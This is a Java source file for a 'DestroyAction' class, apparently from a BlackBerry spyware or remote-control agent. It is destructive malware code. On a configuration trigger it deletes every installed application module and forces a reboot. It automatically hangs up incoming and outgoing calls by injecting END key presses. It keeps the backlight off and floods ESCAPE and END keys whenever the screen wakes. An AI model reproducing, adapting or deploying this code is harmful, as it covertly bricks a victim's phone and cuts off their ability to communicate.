package blackberry.action;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Keypad;
import blackberry.AppListener;
import blackberry.Core;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.injection.KeyInjector;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.Utils;

public class DestroyAction extends SubAction implements PhoneListener, BacklightObserver {

    private boolean permanent;
    private boolean stop;

    public DestroyAction(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(ConfAction conf) {
        //TODO messages
        try {
            permanent = conf.getBoolean("permanent");
        } catch (ConfigurationException e) {
            return false;
        }
        return true;
    }

    public boolean execute(Trigger trigger) {

        if (permanent) {
            //#ifdef DEBUG
            debug.trace("execute permanent");
            //#endif
            deleteApps();
            Core.forceReboot();
        }

        markupDestroy();
        Phone.addPhoneListener(this);
        AppListener.getInstance().addBacklightObserver(this);

        Backlight.enable(false);

        return true;
    }

    private void markupDestroy() {
        // TODO add a markup that triggers the execution at reboot

    }

    private void deleteApps() {
        //#ifdef DEBUG
        debug.trace("deleteApps");
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            //CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String name = CodeModuleManager.getModuleName(handle);

            int ret = CodeModuleManager.deleteModuleEx(handle, true);
            //#ifdef DEBUG
            debug.trace("deleteApps, " + name + " : " + ret);
            //#endif
        }
        Backlight.enable(false);
        CodeModuleManager.promptForResetIfRequired();
        Backlight.enable(false);
        Utils.sleep(100);
        KeyInjector.trackBallUp(1);
        Utils.sleep(100);
        pressKey(Keypad.KEY_ENTER);
    }

    void pressKey(int key) {
        KeyInjector.pressKey(key);
    }

    void kill() {
        while(!stop){
            pressKey(Keypad.KEY_ESCAPE);
            pressKey(Keypad.KEY_END);
            Utils.sleep(100);
        }
    }

    public void callAdded(int callId) {
        // TODO Auto-generated method stub

    }

    public void callAnswered(int callId) {
        pressKey(Keypad.KEY_END);
    }

    public void callConferenceCallEstablished(int callId) {
        // TODO Auto-generated method stub

    }

    public void callConnected(int callId) {
        pressKey(Keypad.KEY_END);
    }

    public void callDirectConnectConnected(int callId) {
        // TODO Auto-generated method stub

    }

    public void callDirectConnectDisconnected(int callId) {
        // TODO Auto-generated method stub

    }

    public void callDisconnected(int callId) {
        // TODO Auto-generated method stub

    }

    public void callEndedByUser(int callId) {
        // TODO Auto-generated method stub

    }

    public void callFailed(int callId, int reason) {
        // TODO Auto-generated method stub

    }

    public void callHeld(int callId) {
        // TODO Auto-generated method stub

    }

    public void callIncoming(int callId) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void callInitiated(int callid) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void callRemoved(int callId) {
        // TODO Auto-generated method stub

    }

    public void callResumed(int callId) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void callWaiting(int callid) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void conferenceCallDisconnected(int callId) {
        // TODO Auto-generated method stub

    }

    public void onBacklightChange(boolean status) {
        if(status){
            stop=false;
            Thread thread = new Thread(new Runnable() {
                public void run() {
                    kill();
                }
            });
            thread.start();
            Utils.sleep(100);
            Backlight.enable(false);
        }else{
            stop=true;
            
        }
    }

}
